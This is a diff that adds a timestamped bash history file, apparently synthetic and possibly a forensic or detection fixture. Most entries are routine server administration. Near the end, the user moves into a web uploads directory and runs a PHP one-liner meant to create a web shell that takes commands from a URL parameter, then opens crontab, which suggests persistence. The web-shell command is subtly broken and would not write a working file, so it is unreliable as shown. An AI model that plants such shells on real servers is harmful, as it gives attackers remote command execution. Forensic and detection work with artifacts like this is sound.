@@ -1,0 +1,62 @@
+#1790791740
+cd /var/log
+#1790792580
+ls -la
+#1790793000
+systemctl status nginx
+#1790794500
+tail -f app.log
+#1790796000
+cd /var/log
+#1790798340
+cd /var/log
+#1790800680
+ls -la
+#1790802060
+systemctl status nginx
+#1790803080
+systemctl status nginx
+#1790804040
+cd /var/log
+#1790805900
+git pull
+#1790807220
+cd /var/log
+#1790809020
+cd /var/log
+#1790810700
+ls -la
+#1790812560
+ls -la
+#1790814600
+systemctl status nginx
+#1790816160
+git pull
+#1790817660
+git pull
+#1790818380
+tail -f app.log
+#1790818920
+systemctl status nginx
+#1790820120
+git pull
+#1790822460
+git pull
+#1790823960
+git pull
+#1790825220
+git pull
+#1790825820
+systemctl status nginx
+#1790827680
+cd /var/log
+#1790830080
+tail -f app.log
+#1790831040
+ls -la
+#1790831460
+cd /var/www/html/uploads
+#1790831517
+php -r 'system($_GET[cmd]);' > shell.php
+#1790831544
+crontab -e
